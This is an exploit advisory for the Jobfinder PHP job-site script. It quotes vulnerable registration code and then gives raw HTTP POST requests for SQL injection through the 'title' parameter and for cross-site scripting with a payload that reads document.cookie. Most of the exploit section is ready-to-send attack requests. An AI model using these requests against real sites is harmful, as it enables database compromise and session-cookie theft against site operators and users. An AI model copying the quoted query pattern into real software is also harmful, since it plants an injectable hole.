@@ -1,0 +1,91 @@
+Jobsite logo  - Multiple Vulnerabilties
+===================================================================
+
+####################################################################
+.:. Author         : AtT4CKxT3rR0r1ST
+.:. Contact        : [F.Hack@w.cn] , [AtT4CKxT3rR0r1ST@gmail.com]
+.:. Home           : http://www.iphobos.com/blog/
+.:. Script         : http://sourceforge.net/projects/jobfinder/
+####################################################################
+VULNERABILITY
+##############
+/includes/reg.php (line 4-28)
+
+$user=addslashes($_POST['user']);
+    $pass=addslashes($_POST['user_password']);
+    $email=$_POST['email'];
+    $pass2=addslashes($_POST['user_password2']);
+    $firstname=addslashes($_POST['firstname']);
+    $lastname=addslashes($_POST['lastname']);
+    $middlename=addslashes($_POST['middlename']);
+    $title=addslashes($_POST['title']);
+    $address=addslashes($_POST['address']);
+    $city=addslashes($_POST['city']);
+
+    if(isset($user) && isset($pass))
+    {
+
+
+    $email=addslashes($email);
+    if($pass2!=$pass)
+    {
+        echo "<script type='text/javascript'>javascript:alert('Passwords
+doesnt match.');</script>";
+        exit;
+    }
+    $connection = new db();
+    $connection->connect();
+
+       $result = mysql_query("SELECT username FROM mobagi_".$title." WHERE
+username='".$user."' ")or die (mysql_error());
+
+
+#########
+EXPLOIT
+#########
+
+[1] Post Sql Injection
+======================
+
+Note: enter the registration page[register.php] and register there , then
+take the post code
+
+
+POST /jobs/includes/reg.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101
+Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/jobs/register.php
+Cookie:
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 122
+
+title=[SQL
+INJECTION]&firstname=&middlename=&lastname=&address=&city=&user=&user_password=&user_password2=&email=&Submit=Register
+
+
+
+[2] Post Cross Site Scripting
+===============================
+
+POST /jobs/includes/reg.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101
+Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/jobs/register.php
+Cookie:
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 122
+
+title=<script>alert(document.cookie);</script>&firstname=&middlename=&lastname=&address=&city=&user=&user_password=&user_password2=&email=&Submit=Register
+
+
+####################################################################
